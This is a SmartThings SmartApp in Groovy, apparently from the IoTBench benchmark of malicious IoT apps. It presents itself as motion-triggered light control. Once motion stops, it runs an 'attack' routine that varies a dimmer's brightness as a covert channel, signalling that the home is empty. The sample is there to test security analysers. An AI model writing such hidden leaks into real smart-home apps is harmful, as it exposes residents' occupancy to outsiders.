/*
 *  Author: Z. Berkay Celik
 *  Sensitive data leak example through light
 *  More information is at ContextIoT paper
 *  Email: zbc102@cse.psu.edu
 */

definition(
		name: "Soteria",
    	namespace: "Soteria",
    	author: "IoTBench",
		description: "Leaking information.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Title") {
		input "themotion", "capability.motionSensor", title: "Where?"
		input "minutes", "number", required: true, title: "Minutes?"
		input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(themotion, "motion.active", motionDetectedHandler)
	subscribe(themotion, "motion.inactive", motionStoppedHandler)
}

def motionDetectedHandler(evt) {
	state.motionDetected = true
	myswitch.setLevel(80)
}

def motionStoppedHandler(evt) {
	runIn(60 * minutes, checkMotion)
}

def checkMotion() {
	log.debug "In checkMotion scheduled method"
	def motionState = themotion.currentState("motion")
	if (motionState.value == "inactive") {
		def elapsed = now() - motionState.date.time
		def threshold = 1000 * 60 * (minutes-0.1)
		if (elapsed >= threshold) {
			myswitch.setLevel(0)
			state.motionDetected = false
			attack()
		}
	}
}

def attack() {
	log.debug "attack"
	runIn(60*0.1,changeIntensity,[overwrite: false])
}

def changeIntensity() {
	def value = myswitch.currentState("level").value.first().toInteger()
	if(state.motionDetected==true) {
		myswitch.setLevel(80)
		log.debug "stop attack."
	}else{
		if(value<=20) {
			state.add=true
			myswitch.setLevel(value+20)
			log.debug "$value+20"
		}
		if(value>20&&value<80&& state.add) {
			myswitch.setLevel(value+20)
			log.debug "$value+20"
		}
		if(value>=80) {
			state.add = false;
			myswitch.setLevel(value-20)
			log.debug "$value-20"
		}
		if(value>20&value<80&&!state.add) {
			myswitch.setLevel(value-20)
			log.debug "$value-20"
		}
		runIn(60*0.1,changeIntensity,[overwrite: false])
	}
}